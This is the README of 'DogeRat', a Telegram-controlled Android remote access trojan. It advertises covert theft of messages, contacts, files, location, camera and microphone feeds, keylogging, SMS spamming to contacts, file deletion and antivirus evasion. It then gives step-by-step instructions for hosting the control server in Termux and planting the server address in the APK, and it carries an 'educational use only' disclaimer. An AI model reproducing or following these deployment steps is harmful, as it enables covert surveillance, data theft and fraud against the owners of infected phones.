![Logo](https://dogelina.com/dogs/logo.png)
<p align="center">
  <i>A multifunctional Telegram based Android RAT without port forwarding</i>
</p>



<h2 align="center">Panel Screenshot</h2>
<p align="center">
  <img src="https://dogelina.com/dogs/scr.jpg" alt="Logo" />
</p>


## Features
- 🔴 Real time
- 🌐 custom web view
- 🔔 notification reader
- 🔔 notification sender (send custom notification that apper on target device with custom click link)
- 🗨️ show toast message on target device (Toasts are messages that appear in a box at the bottom of the device)
- 📡 receive information about simcard provider
- 📳 vibrate target device
- 🛰️ receive device location
- ✉️ receive all target message
- ✉️ send sms with target device to any number
- ✉️ send sms with target device to all of his/her contacts
- 👤 recive all target contacts
- 💻 receive list of all installedd apps in target device
- 📁 receive any file or folder from target device
- 📁 delete any file or folder from target device
- 📷 capture main and front camera
- 🎙 capture microphone (with custom duration)
- 📋 receive last clipboard text
- ✅️ auto start after device boot
- 🔐 Keylogger {Availbe in apk v1 and v2}
- ✨ Beautiful telegram bot interface
-🤖 Undetectable by antivirus
<h2>Requirements</h2>
<ul>
  <li><span style="color: #0074D9;">APK EDITOR</span></li>
  <li><span style="color: #2ECC40;">TERMUX</span></li>
  <li>For hosting server code, you can use some free services like:</li>
  <ul>
    <li><a href="https://replit.com/" style="color: #FF4136;">replit.com</a></li>
    <li><a href="https://glitch.com/" style="color: #FFDC00;">glitch.com</a></li>
    <li><a href="https://heroku.com/" style="color: #B10DC9;">heroku.com</a></li>
  </ul>
  <p align="center">
  <a href="https://shivaya-dav.github.io/dogeweb/">
    <img src="https://img.shields.io/badge/📹%20VIDEO%20TUTORIALS%20AVAILABLE%20HERE-blue?style=for-the-badge" alt="Video Tutorials Available Here" />
  </a>
</p>
  <li>Keep in mind that these sites can suspend your projects, so it's better to host on your own computer.</li>
  
</ul>

<h2 align="center">Download</h2>

<p align="center">
  <a href="https://cybershieldx.com/termux.apk">
    <img src="https://img.shields.io/badge/Termux%20Download-Click%20to%20Download-brightgreen?style=for-the-badge&logo=android" alt="Download Termux" />
  </a>
  <a href="https://cybershieldx.com/editor.apk">
    <img src="https://img.shields.io/badge/APK%20Editor%20Download-Click%20to%20Download-brightgreen?style=for-the-badge&logo=android" alt="Download APK Editor" />
  </a>
</p>


## How to host server in Termux 
<p>Run the following commands in Termux:</p>



```bash  
  pkg update && upgrade -y
  pkg install git -y
  git clone https://github.com/shivaya-dav/DogeRat 
  cd DogeRat
  bash start.sh
Enter your bot token 
Enter your chatid 
And hit enter
Now open a new Tab, and give these commands
pkg install openssh
bash port.sh 
Enter your telegram username And hit enter 
Copy url and minimize the termux
```

## Edit apk
 - Open Apk editor 
 - select apk
 - choose full edit
 - select decode all files
 - go to assets folder
 - open host.json
 - and enter url
 - in socket replace url https to wss 
 - build apk ,start the bott  Enjoy

## example
```bash  
  { 
  "host": "https://yoururl.com/", 
  "socket": "wss://yoururl.com/", 
  "webView": "https://google.com/" 
}
```

## How to Build in Android Studio

To build the application in Android Studio, follow these steps:

1. Open the Android Studio and import the application source code.
2. Navigate to the following path in the source code: `Utils/AppTools.kt`.
3. In the `AppTools.kt` file, locate the `data` variable and copy your server information into it.
4. However, before copying the server information directly into the variable, you must encode it using Base64.
5. Here is an example JSON structure for your server information:
```
{
"host" : "",
"socket" : "",
"webView" : "https://www.google.com"
}
```

6. Fill in the above JSON structure with your server information.
7. Go to https://www.base64encode.org/ and copy the encoded result of your JSON data.
8. In Android Studio, paste the encoded result into the `data` variable.
9. The final code should look like this:

```kotlin
fun getAppData(): AppData {
    val data = "<your encoded server info>"
    val text = decode(data)
    return Gson().fromJson(text, AppData::class.java)
}
```


<h2 align="center">🔗 Contact and Social Media Accounts</h2>

<p align="center">
  <a href="https://t.me/CyberShieldX">
    <img src="https://img.shields.io/badge/CONTACT-TELEGRAM-blue?style=for-the-badge&logo=telegram" alt="Telegram Badge"/>
  </a>
  <a href="https://instagram.com/CyberShieldX">
    <img src="https://img.shields.io/badge/CONTACT-INSTAGRAM-red?style=for-the-badge&logo=instagram" alt="Instagram Badge"/>
  </a>
  <a href="https://twitter.com/CyberShieldX">
    <img src="https://img.shields.io/badge/CONTACT-TWITTER-blue?style=for-the-badge&logo=twitter" alt="Twitter Badge"/>
  </a>
  <a href="https://www.youtube.com/@sphanter/about">
    <img src="https://img.shields.io/badge/CONTACT-YOUTUBE-red?style=for-the-badge&logo=youtube" alt="Youtube Badge"/>
  </a>
</p>


<p align="center">
  <img src="https://img.shields.io/badge/Disclaimer-Important-red" alt="Important Disclaimer"/>
</p>

<p align="center">
  <b><i>Note:</i></b> The developer provides no warranty with this software and will not be responsible for any direct or indirect damage caused by the usage of this tool. Dogerat is built for educational and internal use only.
</p>

<p align="center">
  <b><i>Attention:</i></b> We do not endorse any illegal or unethical use of this tool. The user assumes all responsibility for the use of this software.
</p>

<p align="center">
  <b><i>Important:</i></b> To prevent any fraudulent activity, please ensure that the Instagram username is <a href="https://instagram.com/CyberShieldX"><code>@CYBERSHIELDX</code></a> and the Telegram handle is <a href="https://t.me/CyberShieldX"><code>@CYBERSHIELDX</code></a>. Beware of scams and phishing attempts that use similar usernames or handles.
</p>

<p align="center">
  <b><i>Thank you for using Dogerat - we hope it serves its intended purpose and helps you achieve your goals!</i></b>
</p>





<p align="center">
<h1 align="center">Sponsorship</h1>

<p align="center">If you find my work valuable, you can show your support by sponsoring me. 
  Your contribution will help me maintain and improve my projects, and it will encourage me to create more useful content.</p>

<p align="center">
  <a href="https://www.buymeacoffee.com/shivayadav"><img src="https://img.shields.io/badge/-Buy%20me%20a%20coffee-orange?style=for-the-badge&logo=buy-me-a-coffee&logoColor=white" alt="Buy me a coffee"></a>
</p>

<h2 align="center">Cryptocurrency Donations</h2>

<p align="center">If you prefer to donate using cryptocurrency, you can use the following wallet addresses:</p>

<p align="center">
  Bitcoin: <code>1LeLwYyDHu51875aenZaNcEnMrEbHwEKJd</code> <br>
  USDT TRC20: <code>TWX456AoupoYKwCYUKk3ZMWJtNJZRRHnrp</code>
</p>




<p align="center">Thank you to the following people for their support:</p>

<div align="center">
  <a href="https://github.com/shivaya-dav/DogeRat/stargazers">
    <img src="https://reporoster.com/stars/dark/shivaya-dav/DogeRat" alt="Stargazers" title="Stargazers" width="400" height="auto">
  </a>
  
  <a href="https://github.com/shivaya-dav/DogeRat/network/members">
    <img src="https://reporoster.com/forks/dark/shivaya-dav/DogeRat" alt="Forkers" title="Forkers" width="400" height="auto">
  </a>
</div>
